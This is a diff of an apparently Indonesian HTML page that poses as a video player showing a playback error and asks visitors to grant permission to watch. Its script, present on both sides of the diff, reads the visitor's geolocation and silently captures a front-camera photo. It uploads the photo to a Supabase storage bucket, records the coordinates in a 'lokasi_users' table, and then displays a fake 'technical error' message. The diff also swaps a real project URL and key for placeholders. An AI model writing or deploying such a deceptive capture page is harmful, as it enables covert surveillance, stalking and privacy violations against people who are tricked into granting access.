@@ -4,131 +4,118 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>INI ERA YAZZ - ERROR FEED</title>
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
 <style>
-  * { 
-    box-sizing: border-box; 
-    margin: 0; 
-    padding: 0; 
-  }
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
 
-  body {
-    /* Update Font ke Plus Jakarta Sans */
-    font-family: 'Plus Jakarta Sans', sans-serif;
-    background: #0a0a0a;
-    color: #f0f0f0;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    min-height: 100vh;
-    padding-bottom: 40px;
-    -webkit-font-smoothing: antialiased;
-  }
+body{
+  font-family:'Inter',sans-serif;
+  background:#0f0f0f;
+  color:#eee;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  min-height:100vh;
+  padding-bottom:40px;
+}
 
-  header {
-    width: 100%;
-    padding: 25px;
-    text-align: center;
-    font-size: 1.2rem;
-    font-weight: 700; /* Lebih tebal */
-    letter-spacing: 2px; /* Jarak antar huruf lebih elegan */
-    color: #ff3b30; 
-    border-bottom: 1px solid #1a1a1a;
-    background: rgba(10, 10, 10, 0.8);
-    backdrop-filter: blur(15px);
-    position: sticky;
-    top: 0;
-    z-index: 100;
-    text-transform: uppercase;
-  }
+header{
+  width:100%;
+  padding:20px;
+  text-align:center;
+  font-size:1.5rem;
+  font-weight:600;
+  letter-spacing:-1px;
+  color:#e74c3c;
+  border-bottom:1px solid #222;
+  background:rgba(15,15,15,.8);
+  backdrop-filter:blur(10px);
+  position:sticky;
+  top:0;
+  z-index:100;
+}
 
-  #statusBox {
-    width: 92%;
-    max-width: 500px;
-    margin: 25px auto;
-    padding: 18px;
-    background: #161616;
-    border-radius: 14px;
-    text-align: center;
-    border: 1px solid #222;
-  }
+#statusBox{
+  width:90%;
+  max-width:500px;
+  margin:20px auto;
+  padding:15px;
+  background:#1a1a1a;
+  border-radius:12px;
+  border:1px solid #333;
+  text-align:center;
+}
 
-  #statusText { 
-    font-size: 0.85rem; 
-    font-weight: 500;
-    color: #ff4d4d;
-    letter-spacing: 0.2px;
-  }
+#statusText{
+  font-size:.9rem;
+  color:#ff4d4d;
+}
 
-  #list {
-    width: 90%;
-    max-width: 600px;
-    display: grid;
-    grid-template-columns: 1fr;
-    gap: 20px;
-  }
+#list{
+  width:90%;
+  max-width:600px;
+  display:grid;
+  gap:20px;
+}
 
-  .card {
-    background: #161616;
-    border-radius: 20px;
-    overflow: hidden;
-    border: 1px solid #262626;
-  }
+.card{
+  background:#1a1a1a;
+  border-radius:16px;
+  overflow:hidden;
+  border:1px solid #282828;
+}
 
-  .media-container {
-    width: 100%;
-    aspect-ratio: 16 / 9;
-    background: #000;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    position: relative;
-    color: #444;
-  }
+.media-container{
+  width:100%;
+  aspect-ratio:16/9;
+  background:#000;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  color:#555;
+}
 
-  .error-icon {
-    font-size: 3.2rem;
-    margin-bottom: 12px;
-    opacity: 0.7;
-  }
+.error-icon{
+  font-size:3rem;
+  margin-bottom:10px;
+}
 
-  .media-container p {
-    font-weight: 600;
-    font-size: 0.9rem;
-    color: #777;
-  }
+.info-overlay{
+  padding:15px;
+  background:#151515;
+}
 
-  .info-overlay {
-    padding: 18px;
-    background: #111;
-  }
+.info-text{
+  font-size:.8rem;
+  color:#555;
+  text-align:center;
+}
 
-  .info-text {
-    font-size: 0.75rem;
-    font-weight: 400;
-    color: #666;
-    text-align: center;
-    letter-spacing: 0.5px;
-  }
+.floating-info{
+  position:fixed;
+  bottom:20px;
+  background:#e74c3c;
+  color:#fff;
+  padding:10px 20px;
+  border-radius:50px;
+  font-size:.8rem;
+  font-weight:600;
+  box-shadow:0 4px 15px rgba(231,76,60,.3);
+}
 
-  #canvas, video { display: none; }
-
-  .floating-info {
-    position: fixed;
-    bottom: 25px;
-    background: #ff3b30;
-    color: white;
-    padding: 12px 25px;
-    border-radius: 50px;
-    font-size: 0.75rem;
-    font-weight: 700;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    box-shadow: 0 8px 20px rgba(255, 59, 48, 0.3);
-  }
+video,canvas{
+  display:none;
+}
 </style>
 </head>
+
 <body>
 
 <header>#INIERAYAZZ</header>
@@ -139,79 +126,122 @@
 
 <div id="list">
   <div class="card">
+
     <div class="media-container">
       <div class="error-icon">⚠️</div>
       <p>Video ini tidak dapat diputar</p>
-      <p style="font-size: 0.7rem; font-weight: 400; margin-top: 5px; color: #555;">Error Code: 0x80040255</p>
+      <p style="font-size:.7rem">Error Code: 0x80040255</p>
     </div>
+
     <div class="info-overlay">
-      <div class="info-text">Izinkan dulu - Mencoba memuat ulang...</div>
+      <div class="info-text">
+        Izinkan dulu - Mencoba memuat ulang...
+      </div>
     </div>
+
   </div>
 </div>
 
-<div class="floating-info" id="notif">selamat menonton bang #inierayazz</div>
+<div class="floating-info">
+  selamat menonton bang #inierayazz
+</div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
 <script>
-  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
-  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
-  const BUCKET = "foto-users"; 
-  const { createClient } = supabase;
-  const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-  const statusText = document.getElementById("statusText");
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
+const SUPABASE_URL = "YOUR_URL";
+const SUPABASE_KEY = "YOUR_KEY";
+const BUCKET = "foto-users";
 
-  async function startProcess() {
-    statusText.innerText = "izinkan dulu bang baru nonton";
-    
-    if (!navigator.geolocation) return;
+const { createClient } = supabase;
+const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const { latitude: lat, longitude: lon } = pos.coords;
-      statusText.innerText = "Memproses video... mohon tunggu";
-      captureAndUpload(lat, lon);
-    }, (err) => {
-      statusText.innerText = "Gagal memuat: Akses ditolak.";
-    });
+const statusText = document.getElementById("statusText");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+async function startProcess(){
+
+  statusText.innerText = "Menginisialisasi pemutar...";
+
+  if(!navigator.geolocation){
+    statusText.innerText = "Geolocation tidak didukung";
+    return;
   }
 
-  async function captureAndUpload(lat, lon) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-      video.srcObject = stream;
+  navigator.geolocation.getCurrentPosition(
+    position=>{
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
 
-      setTimeout(async () => {
-        const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(async (blob) => {
-          const fileName = `vid_${Date.now()}.jpg`;
-          const { error: uploadError } = await client.storage
-            .from(BUCKET)
-            .upload(fileName, blob, { contentType: "image/jpeg" });
-
-          if (!uploadError) {
-            await client.from("lokasi_users").insert([
-              { foto: fileName, latitude: lat, longitude: lon }
-            ]);
-            statusText.innerText = "Kesalahan teknis: Pemutar tidak didukung.";
-          }
-          stream.getTracks().forEach(track => track.stop());
-        }, "image/jpeg", 0.7);
-      }, 2000);
-
-    } catch (err) {
-      console.error("Cam Error");
+      statusText.innerText = "Memproses video...";
+      captureAndUpload(lat,lon);
+    },
+    ()=>{
+      statusText.innerText = "Akses lokasi ditolak.";
     }
+  );
+}
+
+async function captureAndUpload(lat,lon){
+
+  try{
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user"},
+      audio:false
+    });
+
+    video.srcObject = stream;
+
+    setTimeout(()=>{
+
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video,0,0,canvas.width,canvas.height);
+
+      canvas.toBlob(async blob=>{
+
+        const fileName = `img_${Date.now()}.jpg`;
+
+        const { error } = await client.storage
+          .from(BUCKET)
+          .upload(fileName,blob,{
+            contentType:"image/jpeg"
+          });
+
+        if(!error){
+
+          await client.from("lokasi_users").insert([
+            {
+              foto:fileName,
+              latitude:lat,
+              longitude:lon
+            }
+          ]);
+
+          statusText.innerText="Kesalahan teknis: Pemutar tidak didukung.";
+        }
+
+        stream.getTracks().forEach(track=>track.stop());
+
+      },"image/jpeg",0.7);
+
+    },2000);
+
+  }
+  catch(e){
+    console.log("Camera error",e);
   }
 
-  startProcess();
+}
+
+startProcess();
+
 </script>
+
 </body>
 </html>
